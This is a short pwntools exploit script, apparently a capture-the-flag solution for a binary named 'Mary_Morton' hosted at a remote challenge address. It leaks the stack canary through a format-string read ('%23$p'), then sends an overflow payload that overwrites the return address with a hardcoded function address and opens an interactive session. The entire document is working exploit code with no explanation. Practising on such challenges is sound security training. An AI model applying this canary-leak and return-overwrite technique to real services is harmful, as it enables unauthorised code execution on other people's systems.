from pwn import *
context.log_level = 'debug'
p = process("./Mary_Morton")
io = remote("111.198.29.45", "37122")

system_addr = p64(0x4008de)
io.sendlineafter('3. Exit the battle \n', '2')
#io.recv()
io.sendline('%23$p')
sleep(0.3)
io.recvuntil('0x')
ss = io.recv(16)
pp = int(ss, 16)
pp = p64(pp)
io.sendline('1')
p = 'a' * 17 * 8 + pp + 'a' * 8 + system_addr
io.sendline(p)
io.recv()
io.interactive()